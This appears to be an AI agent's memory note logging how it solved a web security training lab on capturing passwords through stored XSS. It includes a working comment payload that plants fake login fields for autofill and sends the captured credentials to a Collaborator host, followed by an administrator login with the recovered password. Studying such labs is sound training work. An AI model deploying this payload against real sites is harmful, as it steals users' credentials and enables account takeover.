---
metadata:
  node_type: memory
name: "PRS arm B lab-capturing-passwords"
description: "arm B 冷实例一次通过:存储评论 XSS 注入假 username/password 对诱 autofill,凭证经 Collaborator URL path 外传,administrator 登录后 banner is-solved"
last_updated: 2026-10-09T04:35:51+08:00
created: 2026-10-09T04:35:51+08:00
---

## 结论
lab-capturing-passwords(B 臂,冷实例 reused:false)一次通过,4 步无回退。

## 链路(每步一件一信封)
1. range_launch launch-url /web-security/cross-site-scripting/exploiting/lab-capturing-passwords --jar /tmp/cj1.json → 实例 0a2c00b2…,reused:false,exploit_server:null(该实例确实没有 exploit server,别去找)。
2. http_session get /post?postId=2 → 评论表单 POST /post/comment,字段 csrf/postId/comment/name/email/website;csrf 与 /login 的 csrf 同值。
3. http_session post /post/comment 植入载荷 → 302 /post/comment/confirmation?postId=2。
   载荷: 两个裸 input 假字段 + onchange 外传
   `<input name=username id=username><input type=password name=password onchange="if(this.value.length)new Image().src='https://<collab>/'+encodeURIComponent(username.value+'|'+this.value);">`
4. burp_collab new 取 oastify 域 → nap 15s → burp_collab poll --json。
5. 命中: HTTP 交互路径 `/administrator%7C2rez0z4p6w9x0ge82t47` → 解出 administrator : 2rez0z4p6w9x0ge82t47。
6. http_session post /login(csrf+该凭证)→ 302 /my-account?id=administrator;banner_verdict → solved:true + congrats 行。

## 实测要点
- 信道选型: 外传走 URL path(`new Image().src` 十字节串进路径),不用 POST body —— path 无丢字节风险,Collaborator 面板直接可读。
- poll 报文里 http_request_b64 需自行 base64 解;原始 raw.responses 里的 request 同物。
- banner 时机: 登录成功后立刻读首页可能仍 solved:false(状态未落地),同 jar 重读一次即 is-solved;别据此判失败。
- 载荷用 `new Image().src` 比 `fetch(...,{mode:'no-cors'})` 少一层语义,no-cors/GET 隐含无 CORS 阻碍。
- 评论体不限长度,token 未变化,csrf 可复用同一 jar 会话。

